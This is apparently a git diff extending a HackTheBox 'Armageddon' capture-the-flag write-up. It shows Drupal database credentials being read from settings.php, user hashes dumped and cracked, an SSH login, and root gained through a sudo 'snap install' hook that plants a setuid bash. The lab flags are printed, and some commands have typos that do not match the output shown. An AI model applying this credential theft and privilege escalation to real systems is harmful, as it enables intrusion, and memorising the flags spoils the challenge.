@@ -105,3 +105,97 @@ Linux armageddon.htb 3.10.0-1160.6.1.el7.x86_64 #1 SMP Tue Nov 17 13:59:11 UTC 2
 ```
 
 We can see the **armageddon.htb** which may be needed further down the road. <br>
+
+Searching the drupal configs found the DB credentials at **../sites/default/settings.php**
+```
+$databases = array (
+  'default' => 
+  array (
+    'default' => 
+    array (
+      'database' => 'drupal',
+      'username' => 'drupaluser',
+      'password' => 'CQHEy@9M*m23gBVj',
+      'host' => 'localhost',
+      'port' => '',
+      'driver' => 'mysql',
+      'prefix' => '',
+    ),
+  ),
+);
+```
+
+So i tried to use mysql interactively but it was just freezing, so i went ahead and searched for non-interactive queries execution [here](https://electrictoolbox.com/run-single-mysql-query-command-line/)
+```bash
+So to run a single MySQL query from your regular shell instead of from MySQL’s interactive command line you would do this:
+mysql -u [username] -p [dbname] -e [query]
+``` 
+
+So i build some commands to extract passwords
+```bash
+cmd: mysql -u "drupaluser" -h "localhost" "-pCQHEy@9M*m23gBVj" "drupal" -e "show tables;"
+# ----snip---
+users
+users_roles
+# ----snip---
+
+cmd: mysql -u "drupaluser" -h "localhost" "-pCQHEy@9M*m23gBVj" "drupal" -e "describe users;"
+uid     int(10) unsigned        NO      PRI     0
+name    varchar(60)             NO      UNI
+pass    varchar(128)            NO
+# ---snip---
+
+cmd: mysql -u "drupaluser" -h "localhost" "-pCQHEy@9M*m23gBVj" "drupal" -e "select uid, name, pass from users;"
+1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
+3       test                    $S$Dhd1BggGXot5EmAOTfHCpYcxufquc3rWA66md.Bu4rYRbIwbx.h8
+4       test123                 $S$DWYn3n/vHyQpUnFMkLXc0zxMnKCDHj/IH/57QsuuZS9SNGHhvfaS
+```
+
+My initial idea was to generate a hash and change the **brucetherealadmin** but the **apache** user is not able to run php and thus not run the **/scripts/password-hash.sh** script (which generates a hash for a given password) <br>
+
+So i tried to crack the hash (with john), and it cracked
+```bash
+brucetherealadmin:booboo
+```
+
+Trying it for the ssh service, worked
+```bash
+cmd: whomai && id
+
+brucetherealadmin
+uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+cmd: cat ~/user.txt
+# FLAG: f3a13dc50f1c88e54f257fbb13403cbb
+```
+
+Into root baby! Checking what the user can do as sudo
+```bash
+cmd: sudo -l
+
+---snip---
+User brucetherealadmin may run the following commands on armageddon:
+    (root) NOPASSWD: /usr/bin/snap install *
+```
+
+In gtfobins we have an entry for snap in order to install a malicious package <br>
+
+We need to build it locally with
+```bash
+cd $(mktemp -d)
+mkdir -p meta/hooks
+printf '#!/bin/sh\ncp /bin/bash /home/brucetherealadmin/.w/rootbash && chmod +s /home/brucetherealadmin/.w/rootbash' > meta/hooks/install
+chmod +x meta/hooks/install
+fpm -n waza -s dir -t snap -a all meta
+```
+
+and voila, we are root
+```bash
+cmd: whoami && d
+
+root
+uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) euid=0(root) egid=0(root) groups=0(root),1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+cmd: cat /root/root.txt
+# FLAG: ed16db86a1a5df415b4d3ebdefab4e42
+```
